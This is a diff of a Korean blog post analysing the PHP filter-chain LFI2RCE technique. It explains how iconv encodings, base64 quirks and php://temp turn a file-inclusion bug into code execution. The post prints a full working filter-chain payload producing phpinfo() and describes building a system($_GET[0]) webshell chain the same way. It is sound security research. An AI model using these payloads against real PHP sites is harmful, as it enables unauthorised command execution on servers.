@@ -24,13 +24,13 @@ tags: [Analysis,lfi2rce]
 
 #### What is LFI2RCE?
 
-PHP에서는 동적으로 PHP 파일을 경로로 불러와서 로드할 수 있는 방수가 존재합니다. 
+PHP에서는 동적으로 PHP 파일을 경로로 불러와서 로드할 수 있는 함수가 존재합니다. 
 
 `include`, `require`와 같은 함수들이 주로 사용되는데, 해당 함수를 통해 PHP 파일을 동적으로 불러올 수 있습니다.
 
 해당 파일의 인자로 파일 경로를 받게 되는데, 만약 입력값에 대한 필터링이 존재하지 않으면, 아래와 같이 LFI 취약점이 발생하게 됩니다.
 
-```PHP
+```php
 $goodUserInput = "index.php";
 $badUserInput = "../../../../var/www/html/admin/admin.php";
 
@@ -40,13 +40,13 @@ include($badUserInput); // Load admin admin.php (bad case)
 
 `include`, `require`와 같은 함수는 파일명을 넣게 되면 해당 파일을 단순히 읽는것만이 아니라 PHP 코드일 경우 직접 실행이 가능합니다.
 
-이를 이용하여 공격자가 만약 특정 WebShell 파일을 업로드 할 수 있고, 이를 `include`와 같은 함수에서 LFI 같은 취약점으로 PHP 코드를 실행하게 된다면 WebShell이 실행되어 RCE 취약점까지 번질 수 있습니다.
+이를 이용하여 공격자가 만약 특정 WebShell 파일을 업로드하여 이를 `include`와 같은 함수에서 LFI 같은 취약점으로 PHP 코드를 실행하게 된다면 RCE 취약점까지 번질 수 있습니다.
 
-이는 공격자가 WebShell을 업로드 할 수 있고, 업로드 되는 경로를 알고 있다는 가정하에 가능한 방법입니다. 예전까지는, 공격자가 특정 PHP WebShell 파일을 업로드 할 수 없고, 서버 내부의 경로를 알 수 없다면 단순히 LFI 취약점만 트리거 할 수 있고 RCE는 트리거 할 수 없었습니다.
+예전까지는, 공격자가 특정 PHP WebShell 파일을 업로드 할 수 없거나, 서버 내부의 경로를 알 수 없다면 RCE는 트리거 할 수 없었습니다.
 
 하지만 이번에 PHP Filter Chaining이라는 방법을 사용해 단순 LFI 취약점만 가지고, 특정 경로를 알지 못하더라도 RCE를 실행할 수 있는 방법이 공개되었습니다.
 
-기존의 LFI만을 가지고 RCE를 트리거할 수 있다는 방법은 전세계 보안계와 기업에 큰 영향력을 행사하였고, 이와 같은 공격 기법을 LFI2RCE(LFI To RCE)라고 부르게 되었습니다.
+이와 같은 공격 기법을 LFI2RCE(LFI To RCE)라고 부르게 되었습니다.
 
 #### Background && LFI2RCE Vuln Description (PHP Filter Chaining)
 
@@ -54,13 +54,13 @@ LFI2RCE가 발생하는 방식은 `include`, `require` 함수에서 인자로 PH
 
 여기서 PHP Filter는 PHP에서 지원하는 다양한 기능을 사용할 수 있는 집합인데, 여기서 LFI2RCE에 핵심으로 사용되는 PHP Filter는 iconv 기능입니다.
 
-지구 전세계에는 7000개가 넘는 매우 다양한 언어가 존재하고, 이러한 다양한 언어를 사용하는 사람들이 존재합니다.
+지구 전세계에는 7000개가 넘는 매우 다양한 언어가 존재합니다.
 
-이러한 지구상의 모든 사람들이 인터넷과 같은 서비스를 사용하기 위해서는 그 나라에서 사용하는 언어로 서비스가 번역이 되어야합니다.
+이러한 모든 사람들이 인터넷과 같은 서비스를 사용하기 위해서는 그 나라에서 사용하는 언어로 번역이 되어야합니다.
 
 기본적으로 ASCII 테이블을 알고 있지만, 한국어나 일본어, 중국어 등과 같은 언어는 단순한 ASCII 테이블로는 번역이 불가능하고 표현하는 것도 분명한 한계가 존재합니다.
 
-그래서 특정 언어를 다양한 언어로 번역할 수 있도록 수많은 인코딩 테이블(특정 언어의 집합 테이블)이 만들어지고 이를 사용하게 되었습니다, 이러한 수많은 인코딩 테이블을 저장하고 특정 인코딩을 다른 인코딩으로 변환 할 수 있도록 하는 iconv라는 리눅스 명령어가 만들어지게 되었습니다.
+그래서 특정 언어를 다양한 언어로 번역할 수 있도록 수많은 인코딩 테이블이 만들어지고 이를 사용하게 되었습니다, 이러한 수많은 인코딩 테이블을 저장하고 특정 인코딩을 다른 인코딩으로 변환 할 수 있도록 하는 iconv라는 리눅스 명령어가 만들어지게 되었습니다.
 
 ```sh
 $ iconv -l
@@ -108,8 +108,6 @@ include("php://filter/convert.base64-encode|convert.base64-decode/resource=../..
 // result == "run test.php"
 ```
 
-여기서 결과가 "<?php echo "hello world" ?>"가 나오는 것이 아니라 test.php 코드 실행("run test.php")이 되는 이유는, `include` 함수는 파일 데이터가 PHP 코드라면 해당 코드를 그냥 출력하는 것이 아니라 직접적으로 "실행"하게 됩니다.
-
 그러면 PHP iconv filter를 체이닝하여 인코딩 결과가 기존 값이 아닌 새로운 WebShell 형식의 PHP 코드가 생성되게 한다면, 충분히 RCE가 가능할 것 입니다.
 
 이를 연구하고 테스트했을때 결과적으로 인코딩 결과를 변형하여 WebShell 코드로 만드는 것을 성공하였고 LFI2RCE 개념이 증명되게 되었습니다.
@@ -150,24 +148,13 @@ LFI2RCE를 직접적으로 실행하기 위해서는 먼저 PHP Filter Chain을 
 
 그래서 이를 미리 구현해놓고 원하는 문자에 맞는 PHP Filter Chain을 만들어주는 도구가 존재합니다.
 
-HackTricks에서 개발한 PHP Filter chain generator라는 도구를 사용하면, 원하는 문자를 얻을 수 있게 해주는 PHP Filter Chain을 생성해줍니다.
+Synacktiv에서 개발한 PHP Filter chain generator라는 도구를 사용하면, 원하는 문자를 얻을 수 있게 해주는 PHP Filter Chain을 생성해줍니다.
 
 아래 레퍼런스에서 해당 도구를 직접적으로 실행해볼 수 있습니다.
 
-https://github.com/synacktiv/php_filter_chain_generator
+    Tool Ref : https://github.com/synacktiv/php_filter_chain_generator
 
-```sh
-$ python3 php_filter_chain_generator.py --help             
-usage: php_filter_chain_generator.py [-h] [--chain CHAIN] [--rawbase64 RAWBASE64]
-
-PHP filter chain generator.
-
-optional arguments:
-  -h, --help            show this help message and exit
-  --chain CHAIN         Content you want to generate. (you will maybe need to pad with spaces for your payload to work)
-  --rawbase64 RAWBASE64
-                        The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.
-```
+예를 들어, 해당 도구를 사용하여 "<?php phpinfo(); ?>"가 PHP Filter Chain으로 생성되는 페이로드는 아래와 같습니다.
 
 ```sh
 $ python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>  '
@@ -175,7 +162,7 @@ $ python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>  '
 php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
 ```
 
-위와 같이 "<?php phpinfo(); ?>"와 같은 문자를 PHP Filter Chain으로 만들어내기 위한 방법은 아래의 PHP Filter Chain을 `include`, `require` 함수의 파일 경로에 넣어주면 됩니다.
+이러한 페이로드를 `include`, `require` 함수의 첫번째 인자에 넣어주면 실제로 phpinfo();가 실행된 결과를 볼 수 있습니다. 
 
 ```php
 <?php
@@ -185,13 +172,9 @@ php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.
 ?>
 ```
 
-만들어진 Filter Chain을 직접적으로 실행해보면, 실제로 phpinfo() 함수를 실행한 결과가 출력되는 것을 확인할 수 있습니다.
+해당 도구를 사용해 "<?php phpinfo(); ?>"가 아닌 "<?php system($_GET[0]) ?>" 문자를 PHP Filter Chain으로 생성하여 include 함수에 넣어주게 된다면 시스템 함수가 실행되서 원하는 Command 명령을 실행할 수 있을 것이고, RCE 트리거가 성공하게 됩니다.
 
-해당 도구를 사용해 "<?php phpinfo(); ?>"가 아닌 "<?php system($_GET[0]) ?>" 문자를 PHP Filter Chain으로 생성하여 include 함수에 넣어주게 된다면 쿼리스트링에 첫번째 인자를 system 함수의 첫번째 인자에 넣게 될 것입니다.
-
-그러면 시스템 함수가 실행되서 결론적으로 원하는 Command 명령을 실행할 수 있을 것이고, RCE 트리거가 성공하게 됩니다.
-
-위와 같은 특정 문자에 맞는 PHP Filter Chain을 생성하는 도구의 원리는 아래 색션에서 더 자세하게 다루도록 하겠습니다. 일단은 해당 도구를 사용하게 된다면, 원하는 PHP Filter Chain을 만들어내서 RCE까지 연계할 수 있다는 POC 정도로 축약하겠습니다.
+위와 같은 특정 문자에 맞는 PHP Filter Chain을 생성하는 도구의 원리는 아래 색션에서 더 자세하게 다루도록 하겠습니다. 이번 색션에서는 해당 도구를 사용하면 원하는 PHP Filter Chain을 만들어내서 RCE까지 연계할 수 있다는 POC 정도로 축약하겠습니다.
 
 ### LFI2RCE Dive deeper into how techniques work
 
@@ -207,9 +190,9 @@ php://convert.iconv.<input-encoding>.<output-encoding> OR php://convert.iconv.<i
 
 #### Remove incompatible characters
 
-iconv 기능을 사용하여 인코딩을 통해 생성된 데이터에는 올바르게 인코딩이 된 문자도 분명 존재하겠지만, 다양한 인코딩이 체이닝되게 된다면 이에서 발생하는 쓰레기 문자나 호환되지 않는 정크 문자들도 존재하게 될 것입니다.
+iconv 인코딩을 통해 생성된 데이터에는 올바르게 인코딩이 된 문자도 분명 존재하겠지만, 다양한 인코딩이 체이닝되게 된다면 이에서 발생하는 쓰레기 문자나 호환되지 않는 정크 문자들도 존재하게 될 것입니다.
 
-정크 문자나 쓰레기(쓸모없는) 문자를 제어하기 위해서는 base64를 사용할 수 있습니다.
+정크 문자나 쓰레기 문자를 제어하기 위해서는 base64를 사용할 수 있습니다.
 
 base64를 사용하게 된다면 아래와 같은 경우를 유심하게 살펴보아야 합니다.
 
@@ -237,13 +220,13 @@ aGVsbG8
 
 위와 같이 "@_>" 문자열을 앞에 추가할 경우 아래와 같이 base64 테이블에 존재하지 않는 문자를 디코드하려고했기 때문에 오류가 발생하거나 문제가 발생해야합니다.
 
-![Alt text](../image/image1.png)
+![Alt text](../images/posts/php-in-lfi2rce-analyze/bad_base64.png)
 
-하지만 "test2.txt"를 디코드한 결과를 보면, base64 테이블에 없는 문자를 디코드하려고 해도, 이를 그냥 디코딩해주는 것을 확인할 수 있습니다, 이는 PHP에서 오류가 발생해도 이를 무시한다는 것의 증명입니다.
+하지만 "test2.txt"를 디코드한 결과를 보면 base64 테이블에 없는 문자를 디코드하려고 해도, 이를 그냥 디코딩해주는 것을 확인할 수 있습니다, 이는 PHP에서 오류가 발생해도 이를 무시한다는 것의 증명입니다.
 
-앞서 설명하였듯이 PHP Filter Chain을 이용해 여러가지 인코딩을 하다보면 지원되지 않는 정크 문자가 있을 수 있고, 호환되지 않는 문자가 있을 수 있는데 base64를 사용하게 된다면 이러한 문제가 발생하는 문자도 그냥 무시하고 인코드/디코드를 진행하기 때문에 공격에서 배우 유용하게 사용될 수 있습니다.
+그렇다면, base64를 사용하게 된다면 문제가 발생하는 문자도 그냥 무시하고 인코드/디코드를 진행하기 때문에 공격에서 배우 유용하게 사용될 수 있습니다.
 
-그런데 이러한 PHP base64-decode에서 유일하게 오류가 발생하는 경우가 존재합니다, 특이하지만 아래의 예시를 통해 볼수 있습니다.
+그런데 이러한 PHP base64-decode에서 유일하게 오류가 발생하는 경우가 존재합니다, 특이하지만 아래의 예시를 통해 볼 수 있습니다.
 
 ```php
 <?php
@@ -265,7 +248,7 @@ aGV==sbG8
 
 위와 같이 base64 문자 사이에 등호가 존재할 경우 PHP 내장 함수인 base64_decode함수는 정상적으로 디코딩을 수행하지만 PHP base64-decode Filter에서는 무슨 이유에서인지 오류를 발생시키고 디코딩을 수행하지 않습니다.
 
-그래서 base64-decode를 수행하기 전에 사전에 등호를 제거하는 인코딩이 필요합니다, 좋은 방법으로는 base64 문자를 UTF7 인코딩을 사용하는 방법입니다. UTF7 인코딩으로 문자를 변환한 후 base64-decode를 진행하게 된다면 등호를 인식하지 못하고 정상적으로 디코딩을 진행합니다.
+그래서 base64-decode를 수행하기 전에 사전에 등호를 제거하는 인코딩이 필요합니다, 현재까지 알려진 방법으로는 base64-encode 문자를 UTF7로 인코딩하는 방법입니다. UTF7 인코딩으로 문자를 변환하게 된다면 등호를 인식하지 못하고 정상적으로 디코딩을 진행합니다.
 
 ```php
 // test2.txt
@@ -283,9 +266,7 @@ aGVsbG8==
 
 #### Use encode variations to generate desired characters
 
-이러한 iconv를 사용하게되면, 7000개가 넘는 전세계 모든 언어의 인코딩 테이블을 사용할 수 있습니다.
-
-여기서, PHP Filter Chain을 이용해 특정 문자를 생성하기 위해서는 기본적으로 어떠한 문자라도 존재해야합니다.
+PHP Filter Chain을 이용해 특정 문자를 생성하기 위해서는 기본적으로 어떠한 초기 문자라도 일단 존재해야합니다.
 
 다양한 인코딩 테이블 중 여기서 눈여겨볼 인코딩 테이블은 한국어 문자 인코딩(ISO-2022-KR)입니다. 해당 인코딩은 RFC:[RFC-1557]이라는 부분에 명시되어 있습니다.
 
@@ -321,25 +302,29 @@ RFC 규약에 명시되어 있듯이 문자가 ISO-2022-KR(한국어 인코딩)�
 3. UTF32: \xff\xfe\x00\x00
 ```
 
-위에 명시된 3개의 인코딩 만이 문자 앞에 식별자가 붙는 인코딩입니다. 이렇게 문자 앞에 식별자가 무조건 붙는다는 말은 이를 초기 문자로 지정하고 다른 인코딩을 체이닝하여 원하는 문자를 만들 수 있다는 말이 됩니다.
+위에 명시된 3개의 인코딩만이 문자 앞에 식별자가 붙는 인코딩입니다. 문자 앞에 식별자가 무조건 붙는다는 말은 이를 초기 문자로 지정하고 다른 인코딩을 체이닝하여 원하는 문자를 만들 수 있다는 말이 됩니다.
 
 인코딩을 변환하려면 거의 7000개가 넘는 인코딩을 직접 체인해보면서 어떤 문자가 만들어지는지 알아야합니다, 하지만 여기서 다루게되면 글이 너무나 길어짐으로 "b" 문자를 PHP Filter Chain으로 만드는 방법만 간단하게 확인해보겠습니다.
-
+)
 ![ref: https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it](https://www.synacktiv.com/sites/default/files/inline-images/prepend_characterb_not_working.png)
 
-위와 같이 ISO-2022-KR -> CP1399 -> USC4 -> UTF8 순서로 인코딩을 진행하게 되면 아래와 같이 b라는 문자가 추가되게 됩니다, 하지만 여기서 문제가 발생한 것이 있습니다. 해당 인코딩을 진행하게 되면 "b"라는 문자는 성공적으로 추가되었지만. 기존에 있던 "START"라는 문자의 무결성이 깨지게 되었습니다.
+    사진 출처 : https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it
 
-이는 해당 Filter Chain은 안전하지 않다는 말에 대한 반증입니다. 즉, PHP Filter Chain을 만들때 단순히 원하는 문자가 생성된것만 볼깨 아니라, 무결성이 유지되었는지 확인해야합니다.
+위와 같이 ISO-2022-KR -> CP1399 -> USC4 -> UTF8 순서로 인코딩을 진행하게 되면 "b"라는 문자가 생성되게 됩니다, 하지만 여기서 문제가 발생합니다. "b"라는 문자는 성공적으로 추가되었지만. 기존에 있던 "START"라는 문자의 무결성이 깨지게 되었습니다.
 
-만약 무결성이 유지 되지 않았다면 해당 Filter Chain은 결국 다른 문자를 또 추가하게 된다면 값이 망가져버립니다. 그럼으로 무결성이 유지되면서 원하는 문자가 Filter Chain으로 생성되도록 하는 방법이 필요합니다.
+이는 해당 Filter Chain은 안전하지 않다는 말에 대한 반증입니다. 즉, PHP Filter Chain을 만들때 단순히 원하는 문자가 생성된것만 볼게 아니라, 무결성이 유지되는지 확인해야합니다.
 
-나중에 언급하겠지만 앞서 설명했던 도구(PHP Filter Chain Generator)에 Table에서는 체인이 무결성을 망가뜨리지 않고 의도한 문자를 생성시킵니다.
+만약 무결성이 유지되지 않았다면 해당 Filter Chain은 결국 다른 문자를 또 추가하게 된다면 값이 망가져버립니다. 그럼으로 무결성이 유지되면서 원하는 문자가 Filter Chain으로 생성되도록 하는 방법이 필요합니다.
 
-#### Using `php://temp` to access a valid path
+나중에 언급하겠지만 앞서 설명했던 도구(PHP Filter Chain Generator)에 Table에서는 체인이 무결성을 망가뜨리지 않고 원하는 문자를 생성시킵니다.
 
-마지막으로 문제는 LFI 취약점에서 서버의 구조를 알 수 없기 때문에 resource에 로드할 유효한 파일이 존재해야합니다.
+#### Using php://temp to access a valid path
 
-여기서 해당 문제를 해결하기 위해서는 `php://temp`라는 것을 사용하면 쉽제 문제를 해결할 수 있습니다.
+이제 원하는 문자를 생성할 수 있는 방법이 존재하니 RCE를 수행할 수 있을것 같지만, 한가지 문재가 존재합니다.
+
+LFI 취약점에서는 서버의 구조를 알 수 없기 때문에 PHP Filter resource 부분에 로드할 유효한 파일을 찾아야합니다.
+
+해당 문제를 해결하기 위해서는 `php://temp`라는 것을 사용하면 쉽제 문제를 해결할 수 있습니다.
 
 ```
 php://filter/convert.base64-decode/resource=php://temp
@@ -356,17 +341,17 @@ php://filter/convert.base64-decode/resource=php://temp
 LFI2RCE가 발생하는 원리를 모두 정리해보면 아래와 같습니다.
 
 1. `include`, `require` 등의 PHP 파일 로드 함수에서 LFI 취약점이 발생할 경우 RCE가 트리거 될 수 있음.
-2. 먼저 php filter에서 resource에 들어갈 로드 할 수 있는 유효한 경로의 파일 경로가 들어가야하는데, `php://temp`를 사용하게 되면 /tmp 경로의 랜덤한 파일명으로 읽기/쓰기 권한이 존재하는 파일을 생성해주기 때문에 이를 먼저 진행하여 경로를 설정함.
+2. php filter에서 resource에 들어갈 로드 할 수 있는 유효한 경로의 파일 경로가 들어가야하는데, `php://temp`를 사용하게 되면 /tmp 경로의 랜덤한 파일명으로 읽기/쓰기 권한이 존재하는 파일을 생성해주기 때문에 이를 먼저 진행하여 경로를 설정함.
 2. ISO-20222-KR 등과 같은 문자 앞에 붙는 특수한 식별 문자를 다양한 인코딩과 체이닝하여 원하는 문자를 생성할 수 있는 PHP Filter Chain을 만들어낼 수 있음. (Chain Table : PHP Filter Chain Generator Tool)
 3. PHP Filter Chain에서 생성된 문자는 생성된 값도 나오지만 유효하지 않은 문자나 정크 문자가 만들어질 수 있음.
-4. 여기서 base64 encoding 을 사용하고 decode하게 된다면 유효하지 않는 문자가 존재하여도 오류를 무시하고 만들어진 쓰레기 문자를 지우기 때문에 원하는 문자만 가져올 수 있음 =
+4. 여기서 base64 encoding 을 사용하고 base64-decode하게 된다면 유효하지 않는 문자가 존재하여도 오류를 무시하고 만들어진 쓰레기 문자를 지우기 때문에 원하는 문자만 가져올 수 있음.
 5. 그런데 php filter의 base64-decode 같은 경우는 encode 문자에서 등호가 존재할 경우 이를 인식하지 못하고 문제가 발생하게 됨.
 6. base64 문자를 UTF7로 변환한 후 base64-decode하게 되면 등호를 제거할 수 있음.
 7. 최종적으로 생성된 PHP WebShell Code가 `include` 함수 등에서 사용되면 PHP코드임으로 바로 실행하기 때문에 RCE가 트리거 됨.
 
 ### Analyzing PHP Filter Generator tool code
 
-HackTricks에서 개발한 PHP Filter Chain Generator를 사용하면 원하는 문자를 생성하는 PHP Filter Chain을 만들 수 있다고 설명하였습니다. 
+앞서, Synacktiv에서 개발한 PHP Filter Chain Generator를 사용하면 원하는 문자를 생성하는 PHP Filter Chain을 만들 수 있다고 설명하였습니다. 
 
 이번에는 해당 소스코드를 분석해보면서 어떻게 PHP Filter Chain이 생성되는지 알아보겠습니다.
 
@@ -506,7 +491,7 @@ if __name__ == "__main__":
 
 위 코드는 PHP Filter Chain Generator의 전체적인 소스코드입니다. 부분별로 분석을 진행해보겠습니다.
 
-먼저 HackTricks에서 직접 생성한 Base64 Table은 아래와 같습니다.
+먼저 Synacktiv에서 직접 생성한 Base64 Table은 아래와 같습니다.
 
 ```python
 conversions = {
@@ -584,7 +569,7 @@ conversions = {
 
 해당 테이블은 무결성을 해치지 않고, 기존의 데이터를 합치더라도 변형하지 않기 떄문에, 굉장히 잘 생성된 base64 table이라고 생각이듭니다.
 
-그 다음으로 `--chain "char"`를 통해 입력받은 문자를 어떻게 처리하는지 확인해보겠습니다.
+그 다음으로 `--chain "char"` 명령을 받았을 때, 입력받은 문자를 어떻게 처리하는지 확인해보겠습니다.
 
 ```py
 args = parser.parse_args()
@@ -598,7 +583,7 @@ if args.chain is not None:
 
 위와 같이 "char" 입력받은 문자를 base64 인코딩을 진행한 후 등호를 제거한 다음, generate_filter_chain의 인자로 넘기는 것을 확인할 수 있습니다.
 
-초기에 base64 encode를 진행하여 값을 넘기는 이유는, filter chain 인코딩 과정에서 문제가 발생하여도 최종적으로 base64-decode하게되면 오류를 무시하고 그냥 decode 수행하기 때문에 진행한 것으로 예상됩니다.
+초기에 base64 encode를 진행하여 값을 넘기는 이유는, filter chain 인코딩 과정에서 문제가 발생하여도 최종적으로 base64-decode하게되면 오류를 무시하고 decode를 수행하기 때문에 진행한 것으로 예상됩니다.
 
 이렇게 넘겨진 값은 generate_filter_chain 함수로 넘어가게됩니다.
 
@@ -633,7 +618,7 @@ def generate_filter_chain(chain, debug_base64 = False):
 
 그리고 iconv php filter를 사용해서 base64 encode한 문자를 UTF7로 인코딩을 진행해 등호를 제거합니다.
 
-초기 값 생성이 끝나면 초기에 정의한 php filter chain base64 table을 사용해 1자씩 일치하는 filter chain을 엮는것을 볼 수 있습니다. 여기서 유심히 볼 2가지가 존재합니다. 
+초기 값 생성이 끝나면 초기에 정의한 php filter chain base64 table을 사용해 1문자씩 일치하는 filter chain을 찾아 추가하는 것을 볼 수 있습니다. 여기서 유심히 볼 2가지가 존재합니다. 
 
 1. encoded_chain 문자를 역순으로 넣어주는 이유
 2. 매핑된 php filter chain에서 base64-decode, base64-encode를 진행하는 이유
@@ -653,7 +638,7 @@ base64_encode("a") -> "YQ"
 base64_chain_table["Q"] + base64_chain_table["Y"]
 ```
 
-이와 같이 하는 것이 올바른것으로 생각할 수 있지만, UTF16(유니코드) 인코딩이나 다른 인코딩을 진행할 경우 값이 오른쪽부터 붙는것이 아닌 왼쪽부터 filter chain을 붙이기 때문에, 반대로 진행합니다.
+이와 같이 하는 것이 올바른것으로 생각할 수 있지만, UTF16(유니코드) 인코딩이나 다른 인코딩을 진행할 경우 값이 오른쪽부터 붙는것이 아닌 왼쪽부터 값을 붙이기 때문에, 반대로 진행해야합니다.
 
 위와 같은 경우는 왼쪽부터 값이 붙는것을 이용하면 Y가 먼저 filter chain 한 값으로 붙고 그 다음에 Q가 filter chin한 값이 붙기 때문에 최종적으로 "QY" 처럼 되어버립니다.
 
